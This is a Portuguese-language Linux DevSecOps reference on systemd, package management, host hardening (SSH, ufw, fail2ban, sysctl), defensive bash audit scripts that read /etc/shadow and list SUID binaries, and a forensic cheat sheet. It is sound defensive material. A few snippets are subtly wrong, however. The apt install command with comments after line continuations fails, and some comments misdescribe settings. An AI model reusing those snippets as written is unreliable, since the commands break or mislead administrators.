## 8. Gerenciamento de Serviços (systemd)

### 8.1 `systemctl` — Controle de Serviços

```bash
# Operações básicas
systemctl start nginx
systemctl stop nginx
systemctl restart nginx
systemctl reload nginx      # Recarregar config sem reiniciar (SIGHUP)
systemctl status nginx      # Status detalhado com logs recentes

# Enable/Disable (boot automático)
systemctl enable nginx      # Inicia no boot
systemctl disable nginx     # Não inicia no boot
systemctl enable --now nginx  # Enable + start imediato

# Verificar se está habilitado / rodando
systemctl is-enabled nginx
systemctl is-active nginx
systemctl is-failed nginx

# Listar serviços
systemctl list-units --type=service           # Todos ativos
systemctl list-units --type=service --state=failed  # Serviços com falha
systemctl list-unit-files --type=service      # Todos + estado de boot

# Recarregar systemd após criar/modificar unit file
systemctl daemon-reload

# Mascarar serviço (impede inicialização mesmo manual — mais forte que disable)
systemctl mask telnet.socket
systemctl unmask telnet.socket
```

---

### 8.2 Unit Files — Criando Serviços

```bash
# /etc/systemd/system/security-monitor.service

[Unit]
Description=Security Monitoring Agent
Documentation=https://wiki.empresa.com/security/monitor
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple

# Segurança: rodar como usuário dedicado, não root
User=security-svc
Group=security-svc

# Diretório de trabalho
WorkingDirectory=/opt/security-monitor

# Comando principal
ExecStart=/opt/security-monitor/venv/bin/python3 /opt/security-monitor/agent.py

# Recarregar configuração sem parar
ExecReload=/bin/kill -HUP $MAINPID

# Reiniciar automaticamente em falhas (não em parada manual)
Restart=on-failure
RestartSec=5s

# Timeout para parar graciosamente antes do SIGKILL
TimeoutStopSec=30

# Hardening do serviço (não use root se não precisar)
NoNewPrivileges=true          # Impede ganho de privilégio
PrivateTmp=true               # /tmp privado para o serviço
ProtectSystem=strict          # Sistema de arquivos read-only (exceto /etc, /var, /run)
ProtectHome=true              # Sem acesso a /home /root
ReadWritePaths=/var/log/security-monitor  # Único lugar que pode escrever
CapabilityBoundingSet=        # Remove todas as capabilities (se não precisar de nenhuma)

# Variáveis de ambiente (preferir arquivos protegidos a inline)
EnvironmentFile=/etc/security-monitor/env.conf

# Limites de recursos (previne fork bomb / resource exhaustion)
LimitNOFILE=65536
LimitNPROC=512
MemoryMax=512M

[Install]
WantedBy=multi-user.target
```

```bash
# Ativar o serviço criado
systemctl daemon-reload
systemctl enable --now security-monitor

# Verificar hardening do serviço
systemd-analyze security security-monitor.service
```

---

## 9. Gerenciamento de Pacotes

### 9.1 APT (Debian / Ubuntu)

```bash
# Atualização completa do sistema
apt update                        # Sincronizar lista de repositórios
apt list --upgradable             # Ver o que tem atualização disponível
apt upgrade -y                    # Atualizar pacotes (mantém dependências)
apt full-upgrade -y               # Atualizar removendo conflitos se necessário
apt autoremove -y                 # Remover dependências órfãs

# Instalar pacotes de segurança essenciais
apt install -y \
  fail2ban \          # Bloqueia IPs com tentativas de força bruta
  ufw \               # Firewall simples
  auditd \            # Auditoria do kernel
  aide \              # Detecção de mudanças em arquivos (IDS host-based)
  rkhunter \          # Detector de rootkits
  lynis \             # Auditoria e hardening
  unattended-upgrades # Atualizações automáticas de segurança

# Gerenciar pacotes
apt show nginx                    # Informações do pacote
dpkg -l | grep nginx             # Verificar se está instalado
dpkg -L nginx                    # Arquivos instalados pelo pacote
apt-cache depends nginx           # Dependências do pacote

# Remover completamente (incluindo configs)
apt purge telnet                  # Remove pacote + arquivos de configuração
apt autoremove -y

# Verificar integridade de pacotes instalados
dpkg --verify nginx

# Configurar atualizações automáticas de segurança
dpkg-reconfigure unattended-upgrades
```

---

### 9.2 YUM / DNF (RHEL / CentOS / Amazon Linux)

```bash
# Atualização
yum check-update
yum update -y
dnf update -y                     # DNF é o sucessor do YUM (Fedora/RHEL 8+)

# Instalar pacotes de segurança
yum install -y \
  fail2ban \
  firewalld \
  audit \
  aide \
  rkhunter \
  lynis

# Informações de pacotes
yum info nginx
rpm -qa | grep nginx              # Pacotes instalados
rpm -ql nginx                     # Arquivos do pacote
rpm -V nginx                      # Verificar integridade

# Verificar CVEs em pacotes instalados
yum updateinfo list security      # Atualizações de segurança disponíveis
yum updateinfo list security --installed  # CVEs nos pacotes atuais
```

---

## 10. Hardening e Segurança de Host

### 10.1 SSH — Configuração Segura

```bash
# /etc/ssh/sshd_config — configurações recomendadas para produção

# Porta não padrão (dificulta scanning automático — mas não é segurança real)
Port 2222

# Versão do protocolo (sempre 2)
Protocol 2

# AUTENTICAÇÃO
PermitRootLogin no                  # Nunca permitir login direto como root
PasswordAuthentication no           # Apenas chaves, sem senha
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

# Usuários e grupos permitidos (allowlist é melhor que blocklist)
AllowUsers devsec01 ansible-user deploy-bot
AllowGroups ssh-users

# Configurações de sessão
LoginGraceTime 20                   # 20s para completar autenticação
MaxAuthTries 3                      # 3 tentativas antes de desconectar
MaxSessions 5                       # Máximo de sessões por conexão
ClientAliveInterval 300             # Ping a cada 5min
ClientAliveCountMax 2               # Desconectar após 2 pings sem resposta

# Funcionalidades desnecessárias (desabilitar reduz superfície de ataque)
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no               # Ou 'local' se precisar de port forward
PermitTunnel no
GatewayPorts no
PermitEmptyPasswords no

# Logging
LogLevel VERBOSE                    # Loga fingerprint de chaves usadas

# Algoritmos criptográficos seguros (CIS Benchmark Level 2)
Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-256,hmac-sha2-512,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
```

```bash
# Gerar par de chaves Ed25519 (mais seguro e moderno que RSA)
ssh-keygen -t ed25519 -C "devsec01@empresa.com" -f ~/.ssh/id_ed25519

# Copiar chave pública para o servidor
ssh-copy-id -i ~/.ssh/id_ed25519.pub devsec01@servidor-prod

# Ou manualmente
cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Validar configuração do sshd antes de reiniciar (NUNCA reinicie sem validar!)
sshd -t
systemctl reload sshd
```

---

### 10.2 `ufw` — Firewall de Host

```bash
# Estado atual
ufw status verbose

# Política padrão — deny all inbound, allow all outbound (ponto de partida)
ufw default deny incoming
ufw default allow outgoing

# Regras de entrada
ufw allow 22/tcp                         # SSH
ufw allow from 10.0.0.0/8 to any port 22  # SSH apenas da rede interna
ufw allow 80/tcp
ufw allow 443/tcp

# Regras específicas por IP de origem
ufw allow from 10.100.50.0/24 to any port 5432  # PostgreSQL apenas da rede de apps

# Negar explicitamente (denies têm prioridade sobre allows na mesma regra)
ufw deny from 185.220.101.0/24              # Bloquear range de Tor exit nodes

# Ativar / Desativar (CUIDADO: garanta que SSH está liberado antes de enable!)
ufw enable
ufw disable

# Remover regras
ufw delete allow 8080/tcp
ufw delete 5                             # Por número (ufw status numbered)

# Ver regras numeradas
ufw status numbered

# Logging
ufw logging medium                       # none | low | medium | high | full
tail -f /var/log/ufw.log
```

---

### 10.3 `fail2ban` — Proteção contra Força Bruta

```bash
# Configuração (nunca edite jail.conf — use jail.local)
# /etc/fail2ban/jail.local

[DEFAULT]
bantime  = 3600          # Banir por 1 hora
findtime = 600           # Janela de análise: 10 minutos
maxretry = 5             # Máximo de tentativas antes do ban
banaction = ufw          # Usar ufw para banir (integração)

[sshd]
enabled = true
port    = 22
logpath = /var/log/auth.log
maxretry = 3
bantime = 86400          # SSH: ban por 24h

[nginx-http-auth]
enabled = true
port    = http,https
logpath = /var/log/nginx/error.log

[nginx-limit-req]
enabled = true
port    = http,https
logpath = /var/log/nginx/error.log
maxretry = 10
```

```bash
# Controle do fail2ban
systemctl status fail2ban
fail2ban-client status                   # Ver todas as jails ativas
fail2ban-client status sshd              # Status de uma jail específica

# Ver IPs banidos
fail2ban-client banned

# Desbanir um IP manualmente
fail2ban-client set sshd unbanip 192.168.1.100

# Banir manualmente
fail2ban-client set sshd banip 185.220.101.50

# Testar configuração
fail2ban-client -d                       # Debug mode
```

---

### 10.4 `lynis` — Auditoria de Hardening

```bash
# Executar auditoria completa do sistema
lynis audit system

# Auditoria silenciosa (para automação/CI)
lynis audit system --quiet --no-colors 2>&1 | grep -E "WARNING|SUGGESTION|FOUND"

# Auditar apenas área específica
lynis audit system --tests-from-group authentication
lynis audit system --tests-from-group networking
lynis audit system --tests-from-group storage

# Ver score de hardening
lynis audit system | grep "Hardening index"
# Hardening index : 67 [##############      ]

# Relatório detalhado
cat /var/log/lynis-report.dat
cat /var/log/lynis.log
```

---

### 10.5 `sysctl` — Parâmetros de Kernel para Segurança

```bash
# /etc/sysctl.d/99-security.conf

# ============================================================
# PROTEÇÕES DE REDE
# ============================================================

# Proteção contra SYN flood
net.ipv4.tcp_syncookies = 1

# Ignorar ICMP redirects (previne routing hijacking)
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0

# Não aceitar source routing (previne IP spoofing)
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Proteção contra IP spoofing (reverse path filtering)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignorar broadcast pings (previne Smurf DDoS)
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Não rotear pacotes entre interfaces (não é um router)
net.ipv4.ip_forward = 0               # Mudar para 1 em servidores de VPN/container

# Proteção contra TIME_WAIT assassination
net.ipv4.tcp_rfc1337 = 1

# ============================================================
# PROTEÇÕES DE MEMÓRIA
# ============================================================

# ASLR — randomização de layout de memória (máximo)
kernel.randomize_va_space = 2

# Proibir ptrace entre processos não relacionados (previne process injection)
kernel.yama.ptrace_scope = 1

# Evitar dump de memória de processos SUID
fs.suid_dumpable = 0

# Proteger /proc/<pid> (visível apenas para o dono e root)
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2

# ============================================================
# PROTEÇÕES DE SISTEMA DE ARQUIVOS
# ============================================================

# Prevenir hard links para arquivos que o usuário não possui
fs.protected_hardlinks = 1
fs.protected_symlinks = 1
```

```bash
# Aplicar configurações imediatamente
sysctl -p /etc/sysctl.d/99-security.conf

# Ver todas as configurações atuais
sysctl -a

# Ver configuração específica
sysctl net.ipv4.tcp_syncookies

# Aplicar temporariamente (sem persistência)
sysctl -w net.ipv4.tcp_syncookies=1
```

---

## 11. Bash Scripting para Automação

### 11.1 Fundamentos de Scripting Seguro

```bash
#!/usr/bin/env bash
# Boas práticas no início de todo script de produção

set -euo pipefail
# -e : Sair imediatamente se qualquer comando falhar
# -u : Tratar variáveis não definidas como erro
# -o pipefail : Capturar erros em pipelines (não apenas do último comando)

# Trap para limpeza em caso de erro ou interrupção
trap 'cleanup; exit 1' ERR INT TERM

# Função de cleanup
cleanup() {
  rm -f /tmp/script_$$_*     # Remove arquivos temporários do script
  echo "[CLEANUP] Temporários removidos"
}

# Sempre usar caminhos absolutos em scripts de produção
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

---

### 11.2 Scripts Práticos para DevSecOps

**Script 1: Auditoria rápida de segurança**

```bash
#!/usr/bin/env bash
# security_audit.sh — Auditoria de segurança rápida do host

set -euo pipefail

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'
WARN="${YELLOW}[WARN]${NC}"; FAIL="${RED}[FAIL]${NC}"; OK="${GREEN}[ OK ]${NC}"

echo "=============================================="
echo " Security Audit — $(hostname) — $(date '+%F %T')"
echo "=============================================="

# 1. Usuários com UID 0 (deveria ser apenas root)
echo -e "\n[+] Usuários com UID 0:"
UID0=$(awk -F: '$3 == 0 {print $1}' /etc/passwd)
echo "$UID0" | while read -r user; do
  [[ "$user" == "root" ]] && echo -e "$OK root" || echo -e "$FAIL Usuário '$user' com UID 0!"
done

# 2. Logins sem senha
echo -e "\n[+] Contas sem senha:"
awk -F: '($2 == "" || $2 == "!!" || $2 == "!") {print $1}' /etc/shadow \
  | while read -r user; do
    echo -e "$FAIL Conta sem senha: $user"
  done
echo -e "$OK Verificação concluída"

# 3. Binários SUID/SGID
echo -e "\n[+] Binários SUID (top 10):"
find / -perm /4000 -type f 2>/dev/null | grep -v "^/proc" | head -10 \
  | while read -r f; do echo -e "$WARN $f"; done

# 4. Portas em escuta não esperadas
echo -e "\n[+] Portas em escuta:"
ss -tlnp | tail -n +2 | while read -r line; do
  port=$(echo "$line" | awk '{print $4}' | rev | cut -d: -f1 | rev)
  echo -e "$WARN Porta $port em escuta"
done

# 5. SSH configurações críticas
echo -e "\n[+] Configurações SSH:"
sshd_config="/etc/ssh/sshd_config"
grep -q "^PermitRootLogin no" "$sshd_config" \
  && echo -e "$OK PermitRootLogin = no" \
  || echo -e "$FAIL PermitRootLogin não está desabilitado!"
grep -q "^PasswordAuthentication no" "$sshd_config" \
  && echo -e "$OK PasswordAuthentication = no" \
  || echo -e "$WARN PasswordAuthentication pode estar habilitado"

# 6. Atualizações pendentes
echo -e "\n[+] Pacotes com atualização disponível:"
if command -v apt &>/dev/null; then
  COUNT=$(apt list --upgradable 2>/dev/null | grep -c upgradable || true)
  [[ "$COUNT" -gt 0 ]] \
    && echo -e "$WARN $COUNT pacotes desatualizados" \
    || echo -e "$OK Sistema atualizado"
fi

echo -e "\n=============================================="
echo " Auditoria concluída em $(date '+%T')"
echo "=============================================="
```

---

**Script 2: Monitoramento de alterações de arquivos**

```bash
#!/usr/bin/env bash
# file_integrity_check.sh — Comparar estado atual de /etc com baseline

set -euo pipefail

BASELINE="/root/.security/baseline_etc.md5"
REPORT="/var/log/integrity_check_$(date +%F).log"

mkdir -p "$(dirname "$BASELINE")"

gerar_baseline() {
  echo "[*] Gerando baseline de /etc..."
  find /etc -type f -exec md5sum {} \; 2>/dev/null | sort > "$BASELINE"
  echo "[+] Baseline salvo em $BASELINE ($(wc -l < "$BASELINE") arquivos)"
}

verificar_integridade() {
  if [[ ! -f "$BASELINE" ]]; then
    echo "[!] Baseline não encontrado. Execute com --baseline primeiro."
    exit 1
  fi

  CURRENT=$(mktemp)
  find /etc -type f -exec md5sum {} \; 2>/dev/null | sort > "$CURRENT"

  echo "Relatório de Integridade — $(date)" > "$REPORT"
  echo "======================================" >> "$REPORT"

  # Arquivos modificados
  MODIFIED=$(diff "$BASELINE" "$CURRENT" | grep "^[<>]" | awk '{print $2}' | sort | uniq -d || true)
  if [[ -n "$MODIFIED" ]]; then
    echo -e "\n[!] ARQUIVOS MODIFICADOS:" >> "$REPORT"
    echo "$MODIFIED" >> "$REPORT"
  fi

  # Arquivos novos (presentes no current mas não no baseline)
  NEW=$(comm -13 <(awk '{print $2}' "$BASELINE" | sort) <(awk '{print $2}' "$CURRENT" | sort))
  if [[ -n "$NEW" ]]; then
    echo -e "\n[!] NOVOS ARQUIVOS:" >> "$REPORT"
    echo "$NEW" >> "$REPORT"
  fi

  rm -f "$CURRENT"
  cat "$REPORT"
}

case "${1:-}" in
  --baseline) gerar_baseline ;;
  --check)    verificar_integridade ;;
  *) echo "Uso: $0 [--baseline|--check]" ;;
esac
```

---

**Script 3: Parser de log de autenticação SSH**

```bash
#!/usr/bin/env bash
# ssh_threat_report.sh — Análise de tentativas de invasão SSH

set -euo pipefail

LOG="${1:-/var/log/auth.log}"
THRESHOLD=10

echo "=== SSH Threat Report — $(hostname) — $(date '+%F %T') ==="

# Top IPs com falha de autenticação
echo -e "\n[*] Top 15 IPs com falhas SSH:"
grep "Failed password" "$LOG" 2>/dev/null | \
  awk '{print $(NF-3)}' | \
  grep -E '^[0-9]{1,3}\.' | \
  sort | uniq -c | sort -rn | head -15 | \
  awk -v th="$THRESHOLD" '{
    status = ($1 > th) ? "🚨 ALTO" : "⚠️  "
    printf "  %s %5d tentativas — %s\n", status, $1, $2
  }'

# Usuários mais atacados
echo -e "\n[*] Usuários mais atacados:"
grep "Failed password" "$LOG" 2>/dev/null | \
  awk '{print $(NF-5)}' | \
  sort | uniq -c | sort -rn | head -10 | \
  awk '{printf "  %5d tentativas — usuário: %s\n", $1, $2}'

# Logins bem-sucedidos (validar se são esperados)
echo -e "\n[*] Logins bem-sucedidos (verificar se são esperados):"
grep "Accepted" "$LOG" 2>/dev/null | \
  awk '{print $11, $9, $1, $2, $3}' | \
  sort -u | head -20 | \
  awk '{printf "  ✅ IP: %-18s Usuário: %-15s Data: %s %s %s\n", $1, $2, $3, $4, $5}'

echo -e "\n=== Relatório concluído ==="
```

---

## 12. Referência Rápida — Cheat Sheet

```yaml
# Agrupado por situação de uso em DevSecOps

investigacao_forense:
  "O que mudou recentemente?":    "find / -mmin -60 -type f 2>/dev/null"
  "Quem está conectado agora?":   "w | who | last | lastlog"
  "Quais processos rodam como root?": "ps aux | awk '$1==\"root\"'"
  "Há binários SUID suspeitos?":  "find / -perm /4000 -type f 2>/dev/null"
  "Quais portas estão abertas?":  "ss -tulpn"
  "Quem tentou logar?":           "grep 'Failed' /var/log/auth.log | tail -50"
  "Qual processo usa essa porta?":"lsof -i :PORT"
  "Há conexões suspeitas ativas?":"ss -tn state established | grep -v '10\\.'"

hardening_rapido:
  "Ver configuração SSH insegura": "grep -E 'PermitRoot|Password|X11Fwd' /etc/ssh/sshd_config"
  "Testar configuração SSH":       "sshd -t && echo OK"
  "Ver regras de firewall":        "ufw status numbered | iptables -L -n -v"
  "Ver sudo configurado":          "cat /etc/sudoers /etc/sudoers.d/*"
  "Auditoria de hardening":        "lynis audit system --quiet"
  "Aplicar parâmetros de kernel":  "sysctl -p /etc/sysctl.d/99-security.conf"

gerenciamento_servicos:
  "Ver o que falhou":              "systemctl list-units --state=failed"
  "Ver logs de serviço":           "journalctl -u SERVICO -n 50 --no-pager"
  "Ver logs em tempo real":        "journalctl -fu SERVICO"
  "Verificar hardening do serviço":"systemd-analyze security SERVICO"

rede_diagnostico:
  "IP e interfaces":               "ip -brief addr show"
  "Gateway padrão":                "ip route show default"
  "DNS configurado":               "cat /etc/resolv.conf | grep nameserver"
  "Testar porta remota":           "nc -vz HOST PORT"
  "Capturar tráfego":              "tcpdump -i eth0 -n port PORT"
  "Resolver DNS":                  "dig +short DOMINIO"
  "Testar endpoint HTTP":          "curl -sIL URL | grep -i 'HTTP\\|Server\\|Location'"

logs_e_auditoria:
  "Tentativas SSH":                "grep 'Failed password' /var/log/auth.log | tail -20"
  "Uso de sudo":                   "grep 'sudo:' /var/log/auth.log | tail -20"
  "Logs do sistema (erros)":       "journalctl -p err --since '1 hour ago'"
  "Logs de todos os boots":        "journalctl --list-boots"
  "Auditoria de arquivo":          "ausearch -f /etc/passwd"
```

### Tabela de Comandos por Categoria

|Categoria|Comando|Função|
|---|---|---|
|**Permissão**|`chmod 750 arq`|rwxr-x--- (dono tudo, grupo r+x, outros nada)|
|**Permissão**|`chown user:grp arq`|Muda dono e grupo|
|**Permissão**|`chattr +i arq`|Imutável — nem root remove|
|**Permissão**|`setfacl -m u:user:r arq`|ACL granular por usuário|
|**Busca**|`grep -rn "txt" /dir`|Busca recursiva com número de linha|
|**Busca**|`find / -perm /4000`|Encontra binários SUID|
|**Busca**|`find / -mmin -60`|Arquivos modificados na última hora|
|**Processo**|`ps auxf`|Árvore de processos com detalhes|
|**Processo**|`lsof -i :80`|Quem usa a porta 80|
|**Processo**|`kill -HUP PID`|Recarregar config do processo|
|**Rede**|`ss -tulpn`|Portas em escuta com processo|
|**Rede**|`ip route show`|Tabela de roteamento|
|**Rede**|`tcpdump -i eth0 port 443`|Captura de pacotes|
|**Logs**|`journalctl -fu nginx`|Logs em tempo real de serviço|
|**Logs**|`ausearch -k sudo_changes`|Auditoria de eventos por chave|
|**Serviço**|`systemctl status svc`|Status + logs recentes|
|**Serviço**|`systemd-analyze security svc`|Score de hardening do serviço|
|**Hardening**|`lynis audit system`|Auditoria geral do host|
|**Hardening**|`sysctl -p /etc/sysctl.d/`|Aplicar parâmetros do kernel|
|**Pacotes**|`apt list --upgradable`|Ver atualizações disponíveis|
|**Pacotes**|`dpkg --verify pacote`|Verificar integridade de pacote|

---

_Relacionado: [[01_Fundamentos/Redes]] · [[01_Fundamentos/Conteiners]] · [[02_Ferramentas_Stack/Tenable]] · [[02_Ferramentas_Stack/BigFix Compliance]]_